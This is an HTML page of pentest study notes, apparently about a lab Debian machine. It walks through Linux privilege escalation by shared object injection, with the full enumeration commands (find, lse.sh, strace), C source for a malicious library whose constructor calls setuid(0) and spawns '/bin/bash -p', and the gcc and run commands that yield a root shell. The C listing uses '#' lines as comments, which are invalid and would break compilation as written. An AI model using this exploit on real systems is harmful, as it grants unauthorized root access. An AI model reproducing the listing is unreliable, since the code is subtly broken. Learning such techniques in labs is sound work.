<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shared Object Injection (missing library)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Shared Object Injection (missing library)</h1><br/><br /><strong><h3>Missing Shared Object loaded by an executable</h3></strong><br />• When a program is executed, it will try to load the shared objects it requires.<br />• By using a program called <strong>strace</strong>, we can track these system calls and determine whether any shared objects were not found.<br />   ◇ If we can write to the location the program tries to open:<br />      1- we can create a shared object<br />      2- then spawn a root shell when the shared object is loaded<br /><br /> 0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    <a href=""><img src="images/1307-1.png" alt="images/1307-1.png" /></a><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -type f -a <span style="color:#333333;font-weight:400">\(</span> -perm -u+s -o -perm -g+s <span style="color:#333333;font-weight:400">\)</span> -exec <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">{}</span> <span style="color:#333333;font-weight:400">\;</span> 2&gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/1307-2.png" alt="images/1307-2.png" /></a><br />    <a href=""><img src="images/1307-3.png" alt="images/1307-3.png" /></a><br />    We can see that <strong>suid-so</strong> file should execute with SUID permissions<br /><br />2. Run strace on the SUID file<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ strace  <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-so <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -iE <span style="color:#3ad900;font-weight:400">&quot;open|access|no such file&quot;</span></pre></div><br />    <a href=""><img src="images/1307-4.png" alt="images/1307-4.png" /></a><br />    The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to.<br /><br />3. Create the /home/user/.config directory. If it not exist already:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">mkdir</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>.config</pre></div><br />4. Create the file libcalc.c with the following contents:<br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#0088ff;font-weight:400">#constructor attribute causes the function to be called automatically before execution enters main ()</span><br /><span style="color:#0088ff;font-weight:400"># static is not necessary in this scenario</span><br />static void <span style="color:#ffdd00;font-weight:400">inject()</span> __attribute__<span style="color:#ff9d00;font-weight:700">((</span>constructor<span style="color:#ff9d00;font-weight:700">));</span><br />void <span style="color:#ffdd00;font-weight:400">inject()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/bash -p&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />5. Compile libcalc.c into /home/user/.config/libcalc.so:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">gcc</span> -shared -fPIC -o <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">/</span>.config<span style="color:#ff9d00;font-weight:700">/</span>libcalc.so libcalc.c</pre></div><br />6. Run the SUID executable to get a root shell:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-so</pre></div><br />    <a href=""><img src="images/1307-5.png" alt="images/1307-5.png" /></a></div>
</body>
</html>
